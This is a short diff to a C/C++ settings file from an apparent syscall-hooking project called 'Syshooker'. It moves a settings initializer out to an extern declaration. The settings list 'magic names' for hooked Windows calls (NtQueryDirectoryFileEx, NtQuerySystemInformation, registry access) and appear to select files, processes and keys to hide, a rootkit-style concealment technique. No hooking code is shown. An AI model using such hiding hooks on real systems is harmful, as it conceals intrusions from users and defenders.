@@ -9,12 +9,12 @@ struct SyshookerSettings {
 	wchar_t RegistryKeyMagicName[MAX_PATH_SYSHOOKER];
 };
 
-SyshookerSettings Settings = {
-	L"hideme",		// NtCreateFileMagicName
-	L"wassup",		// NtWriteFileMagicName
-	L"hideme",		// NtQueryDirectoryFileExMagicName
-	L"hideme.exe",	// NtQuerySystemInformationProcessMagicName
-	L"hideme",		// RegistryKeyMagicName
-};
+//SyshookerSettings Settings = {
+//	L"hideme",		// NtCreateFileMagicName
+//	L"wassup",		// NtWriteFileMagicName
+//	L"hideme",		// NtQueryDirectoryFileExMagicName
+//	L"hideme.exe",	// NtQuerySystemInformationProcessMagicName
+//	L"hideme",		// RegistryKeyMagicName
+//};
 
-//extern SyshookerSettings Settings;
+extern SyshookerSettings Settings;
